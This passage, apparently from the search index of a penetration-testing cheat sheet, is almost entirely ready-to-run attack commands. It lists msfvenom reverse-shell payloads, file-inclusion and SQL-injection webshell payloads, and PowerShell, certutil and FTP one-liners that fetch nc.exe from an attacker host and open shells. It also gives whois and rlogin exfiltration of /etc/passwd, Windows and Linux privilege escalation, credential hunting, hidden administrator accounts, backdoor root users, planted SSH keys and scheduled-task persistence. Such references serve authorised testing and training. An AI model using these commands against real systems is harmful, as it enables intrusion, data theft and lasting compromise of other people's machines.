-m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout  \n\n# Generate password candidates: wordlist + pattern;\nhashcat -a6 -m0 \"e99a18c428cb38d5f260853678922e03\" yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout\n\n# Generate NetNLTMv2 with internalMonologue and crack with hashcat\nInternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800\n# resulting hash\nspotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000\n\n# crack with hashcat\nhashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable\n</code></pre>"},{"location":"pentesting/#generating-payload-with-msfvenom","title":"Generating Payload with msfvenom","text":"<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b \"\\x00\\x0a\\x0d\" -e x86/shikata_ga_nai\n</code></pre>"},{"location":"pentesting/#compiling-code-from-linux","title":"Compiling Code From Linux","text":"<pre><code># Windows\ni686-w64-mingw32-gcc source.c -lws2_32 -o out.exe\n\n# Linux\ngcc -m32|-m64 -o output source.c\n</code></pre>"},{"location":"pentesting/#compiling-assembly-from-windows","title":"Compiling Assembly from Windows","text":"<pre><code># https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D\nnasm -f win64 .\\hello.asm -o .\\hello.obj\n\n# http://www.godevtool.com/Golink.zip\nGoLink.exe -o .\\hello.exe .\\hello.obj\n</code></pre>"},{"location":"pentesting/#local-file-inclusion-to-shell","title":"Local File Inclusion to Shell","text":"<pre><code>nc 192.168.1.102 80\nGET /&lt;?php passthru($_GET['cmd']); ?&gt; HTTP/1.1\nHost: 192.168.1.102\nConnection: close\n\n# Then send as cmd payload via http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&amp;cmd=id\n</code></pre>"},{"location":"pentesting/#local-file-inclusion-reading-files","title":"Local File Inclusion: Reading Files","text":"<pre><code>file:///etc/passwd\n\nhttp://example.com/index.php?page=php://input&amp;cmd=ls\n    POST: &lt;?php system($_GET['cmd']); ?&gt;\nhttp://192.168.2.237/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input\n    POST: &lt;?php system('uname -a');die(); ?&gt;\n\nexpect://whoami\nhttp://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php\nhttp://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\nhttp://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd\nhttp://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&amp;cmd=id\nhttp://10.1.1.1/index.php?page=data://text/plain,%3C?php%20system%28%22uname%20-a%22%29;%20?%3E\n\n# ZIP Wrapper\necho \"&lt;pre&gt;&lt;?php system($_GET['cmd']); ?&gt;&lt;/pre&gt;\" &gt; payload.php;  \nzip payload.zip payload.php;   \nmv payload.zip shell.jpg;    \nhttp://example.com/index.php?page=zip://shell.jpg%23payload.php\n\n# Loop through file descriptors\ncurl '' -H 'Cookie: PHPSESSID=df74dce800c96bcac1f59d3b3d42087d' --output -\n</code></pre>"},{"location":"pentesting/#remote-file-inclusion-shell-windows-php","title":"Remote File Inclusion Shell: Windows + PHP","text":"<pre><code>&lt;?php system(\"powershell -Command \\\"&amp; {(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.245/netcat/nc.exe','nc.exe'); cmd /c nc.exe 10.11.0.245 4444 -e cmd.exe\\\" }\"); ?&gt;\n</code></pre>"},{"location":"pentesting/#sql-injection-to-shell-or-backdoor","title":"SQL Injection to Shell or Backdoor","text":"<pre><code># Assumed 3 columns\nhttp://target/index.php?vulnParam=0' UNION ALL SELECT 1,\"&lt;?php system($_REQUEST['cmd']);?&gt;\",2,3 INTO OUTFILE \"c:/evil.php\"-- uMj\n</code></pre> <pre><code># sqlmap; post-request - captured request via Burp Proxy via Save Item to File.\nsqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --threads 10\n</code></pre> <pre><code># netcat reverse shell via mssql injection when xp_cmdshell is available\n1000';+exec+master.dbo.xp_cmdshell+'(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+&gt;+c:\\ftp.txt+%26+ftp+-s:c:\\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd';--\n</code></pre>"},{"location":"pentesting/#sqlite-injection-to-shell-or-backdoor","title":"SQLite Injection to Shell or Backdoor","text":"<pre><code>ATTACH DATABASE '/home/www/public_html/uploads/phpinfo.php' as pwn; \nCREATE TABLE pwn.shell (code TEXT); \nINSERT INTO pwn.shell (code) VALUES ('&lt;?php system($_REQUEST['cmd']);?&gt;');\n</code></pre>"},{"location":"pentesting/#ms-sql-console","title":"MS-SQL Console","text":"<pre><code>mssqlclient.py -port 27900 user:password@10.1.1.1\nsqsh -S 10.1.1.1 -U user -P password\n</code></pre>"},{"location":"pentesting/#upgradig-non-interactive-shell","title":"Upgradig Non-Interactive Shell","text":"<pre><code>python -c 'import pty; pty.spawn(\"/bin/sh\")'\n/bin/busybox sh\n</code></pre>"},{"location":"pentesting/#python-input-code-injection","title":"Python Input Code Injection","text":"<pre><code>__import__('os').system('id')\n</code></pre>"},{"location":"pentesting/#local-enumeration-privilege-escalation","title":"Local Enumeration &amp; Privilege Escalation","text":""},{"location":"pentesting/#check-applocker-policies","title":"Check AppLocker Policies","text":"<pre><code>Get-AppLockerPolicy -Local).RuleCollections\nGet-ChildItem -Path HKLM:Software\\Policies\\Microsoft\\Windows\\SrpV2 -Recurse\nreg query HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\SrpV2\\Exe\\\n</code></pre>"},{"location":"pentesting/#applocker-writable-windows-directories","title":"Applocker: Writable Windows Directories","text":"<pre><code># list from https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md\nC:\\Windows\\Tasks\nC:\\Windows\\Temp\nC:\\windows\\tracing\nC:\\Windows\\Registration\\CRMLog\nC:\\Windows\\System32\\FxsTmp\nC:\\Windows\\System32\\com\\dmp\nC:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\nC:\\Windows\\System32\\spool\\PRINTERS\nC:\\Windows\\System32\\spool\\SERVERS\nC:\\Windows\\System32\\spool\\drivers\\color\nC:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter\nC:\\Windows\\System32\\Tasks_Migrated (after peforming a version upgrade of Windows 10)\nC:\\Windows\\SysWOW64\\FxsTmp\nC:\\Windows\\SysWOW64\\com\\dmp\nC:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter\nC:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System\n</code></pre>"},{"location":"pentesting/#find-writable-filesfolders-in-windows","title":"Find Writable Files/Folders in Windows","text":"<pre><code>$a = Get-ChildItem \"c:\\windows\\\" -recurse -ErrorAction SilentlyContinue\n$a | % {\n    $fileName = $_.fullname\n    $acls = get-acl $fileName  -ErrorAction SilentlyContinue | select -exp access | ? {$_.filesystemrights -match \"full|modify|write\" -and $_.identityreference -match \"authenticated users|everyone|$env:username\"}\n    if($acls -ne $null)\n    {\n        [pscustomobject]@{\n            filename = $fileName\n            user = $acls | select -exp identityreference\n        }\n    }\n}\n</code></pre>"},{"location":"pentesting/#check-if-powershell-logging-is-enabled","title":"Check if Powershell Logging is Enabled","text":"<pre><code>reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\n</code></pre>"},{"location":"pentesting/#check-winevent-logs-for-securestring-exposure","title":"Check WinEvent Logs for SecureString Exposure","text":"<pre><code>Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object -Property Message | Select-String -Pattern 'SecureString'\n</code></pre>"},{"location":"pentesting/#check-winevent-for-machine-wakesleep-times","title":"Check WinEvent for Machine Wake/Sleep times","text":"<pre><code>Get-WinEvent -FilterHashTable @{ ProviderName = 'Microsoft-Windows-Power-TroubleShooter'  ; Id = 1 }|Select-Object -Property @{n='Sleep';e={$_.Properties[0].Value}},@{n='Wake';e={$_.Properties[1].Value}}\n</code></pre>"},{"location":"pentesting/#audit-policies","title":"Audit Policies","text":"<pre><code>auditpol /get /category:*\n</code></pre>"},{"location":"pentesting/#check-if-lsass-is-running-in-ppl","title":"Check if LSASS is running in PPL","text":"<pre><code>reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL\n</code></pre>"},{"location":"pentesting/#binary-exploitation-with-immunitydebugger","title":"Binary Exploitation with ImmunityDebugger","text":""},{"location":"pentesting/#get-loaded-modules","title":"Get Loaded Modules","text":"<pre><code># We're interested in modules without protection, Read &amp; Execute permissions\n!mona modules\n</code></pre>"},{"location":"pentesting/#finding-jmp-esp-address","title":"Finding JMP ESP Address","text":"<pre><code>!mona find -s \"\\xFF\\xE4\" -m moduleName\n</code></pre>"},{"location":"pentesting/#cracking-a-zip-password","title":"Cracking a ZIP Password","text":"<pre><code>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip\n</code></pre>"},{"location":"pentesting/#setting-up-simple-http-server","title":"Setting up Simple HTTP server","text":"<pre><code># Linux\npython -m SimpleHTTPServer 80\npython3 -m http.server\nruby -r webrick -e \"WEBrick::HTTPServer.new(:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd).start\"\nphp -S 0.0.0.0:80\n</code></pre>"},{"location":"pentesting/#mysql-user-defined-fuction-privilge-escalation","title":"MySQL User Defined Fuction Privilge Escalation","text":"<p>Requires raptor_udf2.c and sid-shell.c or full raptor.tar:</p> <p>{% file src=\"../../.gitbook/assets/sid-shell.c\" %}</p> <p>{% file src=\"../../.gitbook/assets/raptor_udf2.c\" %}</p> <p>{% file src=\"../../.gitbook/assets/raptor.tar\" %}</p> <pre><code>gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc\n</code></pre> <pre><code>use mysql;\ncreate table npn(line blob);\ninsert into npn values(load_file('/tmp/raptor_udf2.so'));\nselect * from npn into dumpfile '/usr/lib/raptor_udf2.so';\ncreate function do_system returns integer soname 'raptor_udf2.so';\nselect do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell');\n</code></pre>"},{"location":"pentesting/#docker-privilege-esclation","title":"Docker Privilege Esclation","text":"<pre><code>echo -e \"FROM ubuntu:14.04\\nENV WORKDIR /stuff\\nRUN mkdir -p /stuff\\nVOLUME [ /stuff ]\\nWORKDIR /stuff\" &gt; Dockerfile &amp;&amp; docker build -t my-docker-image . &amp;&amp; docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh' &amp;&amp; ./sh -c id &amp;&amp; ./sh\n</code></pre>"},{"location":"pentesting/#resetting-root-password","title":"Resetting root Password","text":"<pre><code>echo \"root:spotless\" | chpasswd\n</code></pre>"},{"location":"pentesting/#uploading-files-to-target-machine","title":"Uploading Files to Target Machine","text":""},{"location":"pentesting/#tftp","title":"TFTP","text":"<pre><code>#TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp\nservice atftpd start\n\n# Windows\ntftp -i $ATTACKER get /download/location/file /save/location/file\n</code></pre>"},{"location":"pentesting/#ftp","title":"FTP","text":"<pre><code># Linux: set up ftp server with anonymous logon access;\ntwistd -n ftp -p 21 -r /file/to/serve\n\n# Windows shell: read FTP commands from ftp-commands.txt non-interactively;\necho open $ATTACKER&gt;ftp-commands.txt\necho anonymous&gt;&gt;ftp-commands.txt\necho whatever&gt;&gt;ftp-commands.txt\necho binary&gt;&gt;ftp-commands.txt\necho get file.exe&gt;&gt;ftp-commands.txt\necho bye&gt;&gt;ftp-commands.txt \nftp -s:ftp-commands.txt\n\n# Or just a one-liner\n(echo open 10.11.0.245&amp;echo anonymous&amp;echo whatever&amp;echo binary&amp;echo get nc.exe&amp;echo bye) &gt; ftp.txt &amp; ftp -s:ftp.txt &amp; nc.exe 10.11.0.245 443 -e cmd\n</code></pre>"},{"location":"pentesting/#certutil","title":"CertUtil","text":"<pre><code>certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe\n</code></pre>"},{"location":"pentesting/#php_1","title":"PHP","text":"<pre><code>&lt;?php file_put_contents(\"/var/tmp/shell.php\", file_get_contents(\"http://10.11.0.245/shell.php\")); ?&gt;\n</code></pre>"},{"location":"pentesting/#python_1","title":"Python","text":"<pre><code>python -c \"from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\\\Temp\\\\nc.exe')\"\n</code></pre>"},{"location":"pentesting/#http-powershell","title":"HTTP: Powershell","text":"<pre><code>powershell -Command \"&amp; {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe\" }\npowershell -Command \"&amp; {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'\" }\npowershell -Command \"(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe')\"; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'\"\npowershell (New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/file.exe','file.exe');(New-Object -com Shell.Application).ShellExecute('file.exe');\n\n# download using default proxy credentials and launch\npowershell -command { $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString(\"http://$attacker/nc.exe\") | Out-File nc.exe; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'\" }\n</code></pre>"},{"location":"pentesting/#http-vbscript","title":"HTTP: VBScript","text":"<p>Copy and paste contents of wget.vbs into a Windows Shell and then:</p> <pre><code>cscript wget.vbs http://$ATTACKER/file.exe localfile.exe\n</code></pre>"},{"location":"pentesting/#http-linux","title":"HTTP: Linux","text":"<pre><code>wget http://$ATTACKER/file\ncurl http://$ATTACKER/file -O\nscp ~/file/file.bin user@$TARGET:tmp/backdoor.py\n</code></pre>"},{"location":"pentesting/#netcat","title":"NetCat","text":"<pre><code># Attacker\nnc -l -p 4444 &lt; /tool/file.exe\n\n# Victim\nnc $ATTACKER 4444 &gt; file.exe\n</code></pre>"},{"location":"pentesting/#http-windows-debugexe-method","title":"HTTP: Windows \"debug.exe\" Method","text":"<pre><code># 1. In Linux, convert binary to hex ascii:\nwine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt\n# 2. Paste nc.txt into Windows Shell.\n</code></pre>"},{"location":"pentesting/#http-windows-bitsadmin","title":"HTTP: Windows BitsAdmin","text":"<pre><code>cmd.exe /c \"bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\\payload.exe&amp;start %tmp%\\payload.exe\n</code></pre>"},{"location":"pentesting/#wscript-script-code-download-execution","title":"Wscript Script Code Download &amp; Execution","text":"<p>{% tabs %} {% tab title=\"cmd\" %} <pre><code>echo GetObject(\"script:https://bad.com/code.js\") &gt; code.js &amp;&amp; wscript.exe code.js\n</code></pre> {% endtab %}</p> <p>{% tab title=\"code.js\" %} <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;package&gt;\n&lt;component id=\"PopCalc\"&gt;\n&lt;script language=\"JScript\"&gt;\n    &lt;![CDATA[\n    var r = new ActiveXObject(\"WScript.Shell\").Run(\"calc\"); \n    ]]&gt;\n&lt;/script&gt;\n&lt;/component&gt;\n&lt;/package&gt;\n</code></pre> {% endtab %} {% endtabs %}</p>"},{"location":"pentesting/#whois-data-exfiltration","title":"Whois Data Exfiltration","text":"<pre><code># attacker\nnc -l -v -p 43 | sed \"s/ //g\" | base64 -d\n# victim\nwhois -h $attackerIP -p 43 `cat /etc/passwd | base64`\n</code></pre>"},{"location":"pentesting/#cancel-data-exfiltration","title":"Cancel Data Exfiltration","text":"<pre><code>cancel -u \"$(cat /etc/passwd)\" -h ip:port\n</code></pre>"},{"location":"pentesting/#rlogin-data-exfiltration","title":"rlogin Data Exfiltration","text":"<pre><code>rlogin -l \"$(cat /etc/passwd)\" -p port host\n</code></pre>"},{"location":"pentesting/#bash-ping-sweeper","title":"Bash Ping Sweeper","text":"<pre><code>#!/bin/bash\nfor lastOctet in {1..254}; do \n    ping -c 1 10.0.0.$lastOctet | grep \"bytes from\" | cut -d \" \" -f 4 | cut -d \":\" -f 1 &amp;\ndone\n</code></pre>"},{"location":"pentesting/#brute-forcing-xored-string-with-1-byte-key-in-python","title":"Brute-forcing XOR'ed string with 1 byte key in Python","text":"<pre><code>encrypted = \"encrypted-string-here\"\nfor i in range(0,255):\n    print(\"\".join([chr(ord(e) ^ i) for e in encrypted]))\n</code></pre>"},{"location":"pentesting/#generating-bad-character-strings","title":"Generating Bad Character Strings","text":"<pre><code># Python\n'\\\\'.join([ \"x{:02x}\".format(i) for i in range(1,256) ])\n</code></pre> <pre><code># Bash\nfor i in {1..255}; do printf \"\\\\\\x%02x\" $i; done; echo -e \"\\r\"\n</code></pre>"},{"location":"pentesting/#converting-python-to-windows-executable-py-exe","title":"Converting Python to Windows Executable (.py -&gt; .exe)","text":"<pre><code>python pyinstaller.py --onefile convert-to-exe.py\n</code></pre>"},{"location":"pentesting/#port-scanning-with-netcat","title":"Port Scanning with NetCat","text":"<pre><code>nc -nvv -w 1 -z host 1000-2000\nnc -nv -u -z -w 1 host 160-162\n</code></pre>"},{"location":"pentesting/#port-scanning-with-masscan","title":"Port Scanning with Masscan","text":"<pre><code>masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0\n</code></pre>"},{"location":"pentesting/#exploiting-vulnerable-windows-services-weak-service-permissions","title":"Exploiting Vulnerable Windows Services: Weak Service Permissions","text":"<pre><code># Look for SERVICE_ALL_ACCESS in the output\naccesschk.exe /accepteula -uwcqv \"Authenticated Users\" *\n\nsc config [service_name] binpath= \"C:\\nc.exe 10.11.0.245 443 -e C:\\WINDOWS\\System32\\cmd.exe\" obj= \"LocalSystem\" password= \"\"\nsc qc [service_name] (to verify!)\nsc start [service_name]\n</code></pre>"},{"location":"pentesting/#find-filefolder-permissions-explicitly-set-for-a-given-user","title":"Find File/Folder Permissions Explicitly Set for a Given User","text":"<pre><code>icacls.exe C:\\folder /findsid userName-or-*sid /t\n//look for (F)ull, (M)odify, (W)rite\n</code></pre>"},{"location":"pentesting/#alwaysinstallelevated-msi","title":"AlwaysInstallElevated MSI","text":"<pre><code>reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated &amp; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n</code></pre>"},{"location":"pentesting/#stored-credentials-windows","title":"Stored Credentials: Windows","text":"<pre><code>c:\\unattend.xml\nc:\\sysprep.inf\nc:\\sysprep\\sysprep.xml\ndir c:\\*vnc.ini /s /b\ndir c:\\*ultravnc.ini /s /b \ndir c:\\ /s /b | findstr /si *vnc.ini\n\nfindstr /si password *.txt | *.xml | *.ini\nfindstr /si pass *.txt | *.xml | *.ini\ndir /s *cred* == *pass* == *.conf\n\n# Windows Autologon\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"\n\n# VNC\nreg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"\n\n# Putty\nreg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"\n\n# Registry\nreg query HKLM /f password /t REG_SZ /s \nreg query HKCU /f password /t REG_SZ /s\n</code></pre>"},{"location":"pentesting/#unquoted-service-path","title":"Unquoted Service Path","text":"<pre><code>wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |findstr /i /v \"\"\"\nwmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\"\n</code></pre>"},{"location":"pentesting/#persistence-via-services","title":"Persistence via Services","text":"<pre><code># cmd\nsc create spotlessSrv binpath= \"C:\\nc.exe 10.11.0.245 443 -e C:\\WINDOWS\\System32\\cmd.exe\" obj= \"LocalSystem\" password= \"\"\n\n# powersehll\nNew-Service -Name EvilName -DisplayName EvilSvc -BinaryPathName \"'C:\\Program Files\\NotEvil\\back.exe'\" -Description \"Not at all\"\n</code></pre>"},{"location":"pentesting/#port-forwarding-ssh-tunneling","title":"Port Forwarding / SSH Tunneling","text":""},{"location":"pentesting/#ssh-local-port-forwarding","title":"SSH: Local Port Forwarding","text":"<pre><code># Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER\n# Scenario: access a host that's being blocked by a firewall via SSH_SERVER;\nssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER\n</code></pre>"},{"location":"pentesting/#ssh-dynamic-port-forwarding","title":"SSH: Dynamic Port Forwarding","text":"<pre><code># Listen on local port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER\n# Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;\nssh -D 127.0.0.1:8080 user@SSH_SERVER\n</code></pre>"},{"location":"pentesting/#ssh-remote-port-forwarding","title":"SSH: Remote Port Forwarding","text":"<pre><code># Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389\n# Scenario: expose RDP on non-routable network;\nssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER\nplink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP\n</code></pre>"},{"location":"pentesting/#proxy-tunnel","title":"Proxy Tunnel","text":"<pre><code># Open a local port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128\n# Scenario: a remote host has SSH running, but it's only bound to 127.0.0.1, but you want to reach it;\nproxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555\nssh user@127.0.0.1 -p 5555\n</code></pre>"},{"location":"pentesting/#http-tunnel-ssh-over-http","title":"HTTP Tunnel: SSH Over HTTP","text":"<pre><code># Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22\nhts -F localhost:22 80\n\n# Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80\nhtc -F 8080 192.168.1.15:80\n\n# Client - connect to localhost:8080 -&gt; get tunneled to 192.168.1.15:80 -&gt; get redirected to 192.168.1.15:22\nssh localhost -p 8080\n</code></pre>"},{"location":"pentesting/#netsh-windows-port-forwarding","title":"Netsh - Windows Port Forwarding","text":"<pre><code># requires admin\nnetsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport\n</code></pre>"},{"location":"pentesting/#runas-start-process-as","title":"RunAs / Start Process As","text":""},{"location":"pentesting/#powershell","title":"PowerShell","text":"<pre><code># Requires PSRemoting\n$username = 'Administrator';$password = '1234test';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command { whoami }\n\n# without PSRemoting\ncmd&gt; powershell Start-Process cmd.exe -Credential (New-Object System.Management.Automation.PSCredential 'username', (ConvertTo-SecureString 'password' -AsPlainText -Force))\n\n# without PS Remoting, with arguments\ncmd&gt; powershell -command \"start-process cmd.exe -argumentlist '/c calc' -Credential (New-Object System.Management.Automation.PSCredential 'username',(ConvertTo-SecureString 'password' -AsPlainText -Force))\"\n</code></pre>"},{"location":"pentesting/#cmd","title":"CMD","text":"<pre><code># Requires interactive console\nrunas /user:userName cmd.exe\n</code></pre>"},{"location":"pentesting/#psexec","title":"PsExec","text":"<pre><code>psexec -accepteula -u user -p password cmd /c c:\\temp\\nc.exe 10.11.0.245 80 -e cmd.exe\n</code></pre>"},{"location":"pentesting/#pth-winexe","title":"Pth-WinExe","text":"<pre><code>pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe\n</code></pre>"},{"location":"pentesting/#recursively-find-hidden-files-windows","title":"Recursively Find Hidden Files: Windows","text":"<pre><code>dir /A:H /s \"c:\\program files\"\n</code></pre>"},{"location":"pentesting/#general-file-search","title":"General File Search","text":"<pre><code># Query the local db for a quick file find. Run updatedb before executing locate.\nlocate passwd \n\n# Show which file would be executed in the current environment, depending on $PATH environment variable;\nwhich nc wget curl php perl python netcat tftp telnet ftp\n\n# Search for *.conf (case-insensitive) files recursively starting with /etc;\nfind /etc -iname *.conf\n</code></pre>"},{"location":"pentesting/#post-exploitation-maintaining-access","title":"Post-Exploitation &amp; Maintaining Access","text":""},{"location":"pentesting/#browsing-registry-hives","title":"Browsing Registry Hives","text":"<pre><code>hivesh /registry/file\n</code></pre>"},{"location":"pentesting/#decrypting-rdg-passwords","title":"Decrypting RDG Passwords","text":"<p>Remote Desktop Connection Manager passwords can be decrypted on the same computer/account they were encrypted:</p> <pre><code>Copy-Item 'C:\\Program Files (x86)\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.exe C:\\temp\\RDCMan.dll\u2019\nImport-Module C:\\temp\\RDCMan.dll\n$EncryptionSettings = New-Object -TypeName RdcMan.EncryptionSettings\n[RdcMan.Encryption]::DecryptString($PwdString, $EncryptionSettings)\n</code></pre>"},{"location":"pentesting/#decrypting-vnc-password","title":"Decrypting VNC Password","text":"<pre><code>wine vncpwdump.exe -k key\n</code></pre>"},{"location":"pentesting/#creating-user-and-adding-to-local-administrators","title":"Creating User and Adding to Local Administrators","text":"<pre><code>net user spotless spotless /add &amp; net localgroup Administrators spotless /add\n</code></pre>"},{"location":"pentesting/#hide-newly-created-local-administrator","title":"Hide Newly Created Local administrator","text":"<pre><code>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /t REG_DWORD /v spotless /d 0 /f\n</code></pre>"},{"location":"pentesting/#creating-ssh-authorized-keys","title":"Creating SSH Authorized Keys","text":"<pre><code>mkdir /root/.ssh 2&gt;/dev/null; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChKCUsFVWj1Nz8SiM01Zw/BOWcMNs2Zwz3MdT7leLU9/Un4mZ7vjco0ctsyh2swjphWr5WZG28BN90+tkyj3su23UzrlgEu3SaOjVgxhkx/Pnbvuua9Qs9gWbWyRxexaC1eDb0pKXHH2Msx+GlyjfDOngq8tR6tkU8u1S4lXKLejaptiz0q6P0CcR6hD42IYkqyuWTNrFdSGLtiPCBDZMZ/5g1cJsyR59n54IpV0b2muE3F7+NPQmLx57IxoPjYPNUbC6RPh/Saf7o/552iOcmVCdLQDR/9I+jdZIgrOpstqSiJooU9+JImlUtAkFxZ9SHvtRbFt47iH7Sh7LiefP5 root@kali' &gt;&gt; /root/.ssh/authorized_keys\n</code></pre>"},{"location":"pentesting/#creating-backdoor-user-wo-password","title":"Creating Backdoor User w/o Password","text":"<pre><code>echo 'spotless::0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd\n\n# Rarely needed, but if you need to add a password to the previously created user by using useradd and passwd is not working. Pwd is \"kali\"\nsed 's/!/\\$6$o1\\.HFMVM$a3hY6OPT\\/DiQYy4koI6Z3\\/sLiltsOcFoS5yCKhBBqQLH5K1QlHKL8\\/6wJI6uF\\/Q7mniOdq92v6yjzlVlXlxkT\\./' /etc/shadow &gt; /etc/s2; cat /etc/s2 &gt; /etc/shadow; rm /etc/s2\n</code></pre>"},{"location":"pentesting/#creating-another-root-user","title":"Creating Another root User","text":"<pre><code>useradd -u0 -g0 -o -s /bin/bash -p `openssl passwd yourpass` rootuser\n</code></pre>"},{"location":"pentesting/#generating-openssl-password","title":"Generating OpenSSL Password","text":"<pre><code>openssl passwd -1 password \n# output $1$YKbEkrkZ$7Iy/M3exliD/yJfJVeTn5.\n</code></pre>"},{"location":"pentesting/#persistent-back-doors","title":"Persistent Back Doors","text":"<pre><code># Launch evil.exe every 10 minutes\nschtasks /create /sc minute /mo 10 /tn \"TaskName\" /tr C:\\Windows\\system32\\evil.exe\n</code></pre>"},{"location":"pentesting/#code-execution-application-whitelist-bypass","title":"Code Execution / Application Whitelist Bypass","text":""},{"location":"pentesting/#ieframedll","title":"Ieframe.dll","text":"<pre><code>rundll32 c:\\windows\\system32\\ieframe.dll,OpenURL c:\\temp\\test.url\n</code></pre> 